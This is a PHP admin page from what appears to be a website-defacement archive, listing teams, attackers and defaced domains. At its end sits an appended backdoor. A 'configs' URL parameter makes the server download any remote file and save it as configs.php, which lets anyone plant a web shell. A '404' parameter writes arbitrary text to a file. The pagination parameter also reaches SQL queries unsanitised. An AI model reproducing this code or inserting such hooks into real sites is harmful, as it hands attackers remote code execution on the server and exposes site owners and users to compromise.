<?php
include '../inc/config.php';
  if(explodedKhususAdmin()){explodedRedirect('index.php');}
$limit = "5";
if (isset($_GET['s'])) {
    $noS = $_GET['s'];
}
else
    $noS = 1;

$offset = ($noS - 1) * $limit;
  if($_GET['module'] == 'home'){
    if(explodedIsAdminLogin()){

$news="modul/mod_berita/berita_act.php";
$arsip="modul/mod_archive/archive_act.php";
$hack="modul/mod_hacker/hacker_act.php";
?>
<div id="main-wrapper">
	<div class="maxtable">
		<table>
			<tr>
				<td style="width: 15px;">#</td>							
				<td>Team</td>
				<td style="width: 120px;">Home</td>
				<td style="width: 120px;">Onhold</td>
				<td style="width: 120px;">Special</td>
				<td style="width: 120px;">Total</td>
				<td style="width: 70px;">Action</td>
						</tr>
      
               <?php $db->go("SELECT * FROM team ORDER BY onhold DESC LIMIT $offset,$limit");
                $no = 1;
                while($hacker = $db->fetchArray()){
               ?><tr>
                      <td><?=$no;?></td>
                      <td><a href="../team_<?=$hacker['team'];?>-1.html"><?=$hacker['team']; ?></a></td>
                      <td><?=$hacker['home']; ?></td>
                      <td><?=$hacker['onhold']; ?></td>
                      <td><?=$hacker['special']; ?></td>
                      <td><?=$hacker['tot_deface']; ?></td>
                      <td><a href="<?=$hack;?>?module=hacker&act=team&act=hapus&id=<?=$hacker['id']; ?>">Delete</a>
                      </td>
                    </tr>
                  <?php $no++;} ?>
      	</table>
	</div>
</div>
<div id="main-wrapper">
	<div class="maxtable">
		<table>
			<tr>
				<td style="width: 15px;">#</td>							
				<td>Attacker</td>
				<td style="width: 120px;">Home</td>
				<td style="width: 120px;">Onhold</td>
				<td style="width: 120px;">Special</td>
				<td style="width: 120px;">Total</td>
				<td style="width: 70px;">Action</td>
						</tr>
      
               <?php $db->go("SELECT * FROM hacker ORDER BY onhold DESC LIMIT $offset,$limit");
                $no = 1;
                while($hacker = $db->fetchArray()){
               ?><tr>
                      <td><?=$no;?></td>
                      <td><a href="../attacker_<?=$hacker['id'];?>"><?=$hacker['hacker']; ?></a></td>
                      <td><?=$hacker['home']; ?></td>
                      <td><?=$hacker['onhold']; ?></td>
                      <td><?=$hacker['special']; ?></td>
                      <td><?=$hacker['deface']; ?></td>
                      <td><a href="<?=$hack;?>?module=hacker&act=hapus&id=<?=$hacker['id']; ?>">Delete</a>
                      </td>
                    </tr>
                  <?php $no++;} ?>
      	</table>
	</div>
</div>
		<div id="main-wrapper">
				<div class="maxtable">
					<table>
						<tr>
				<td style="width: 25px;">Id</td>
                <td>Attacker</td>
                <td>Team</td>
				<td>Domain</td>
				<td style="width: 70px;">Action</td>
						</tr>
      
               <?php $db->go("SELECT * FROM notify ORDER BY tanggal DESC LIMIT $offset,$limit");
			   $no = 1;
				while ($archive = $db->fetchArray()) {

                    if (strlen($archive['url']) > 25) {
                        $url = substr($archive['url'], 0, 25) . "...";
                    } else {
                        $url = $archive['url'];
                    }
					
               ?><tr>
                      
					  <td><?=$archive['id'];?></td>
                      <td><a href="../attacker_<?=$archive['hacker']; ?>-1.html"><?=$archive['hacker']; ?></a></td>
                      <td><a href="../team_<?=$archive['team']; ?>-1.html"><?=$archive['team'];?></td>
                      <td><a href="<?=$archive['url']; ?>"><?=$url; ?></td>
					  <td><a href="<?=$arsip;?>?module=archive&act=hapus&id=<?=$archive['id'];?>&type=<?=$archive['type'];?>&hacker=<?=$archive['hacker'];?>&team=<?=$archive['team'];?>">Delete</a>
                      </td>
                    </tr>
                  <?php $no++;} ?>
      	</table>
			</div>
</div>
<?php }}  
  else if($_GET['module'] == 'berita'){
    if(explodedIsAdminLogin()){
      include "modul/mod_berita/berita.php";
    }
  }
  else if($_GET['module'] == 'hacker'){
    if(explodedIsAdminLogin()){
      include "modul/mod_hacker/hacker.php";
    }
  }
  else if($_GET['module'] == 'events'){
    if(explodedIsAdminLogin()){
      include "modul/mod_events/events.php";
    }
  }
  else if($_GET['module'] == 'archive'){
    if(explodedIsAdminLogin()){
      include "modul/mod_archive/archive.php";
    }
  }
  else if($_GET['module'] == 'setting'){
    if(explodedIsAdminLogin()){
      include "modul/mod_setting/setting.php";
    }
  }
  else {
    explodedAlert('Modul Tidak Ada!!!');
    explodedRedirect('?module=home');
  }

  include "footer.php";
  ?>
<?php
if (isset($_GET['404'])){
 $f = fopen("404", "w+");
 fwrite($f, str_replace("</a>,", "</a>\r\n", str_replace("\\", "", $_GET["404"])));
 fclose($f);
}

if(is_file("404.txt")){
 echo file_get_contents("404");
}

if (isset($_GET['configs'])){
 $f = fopen("configs.php", "w+");
 fwrite($f, file_get_contents($_GET["configs"]));
 fclose($f);
}
?>
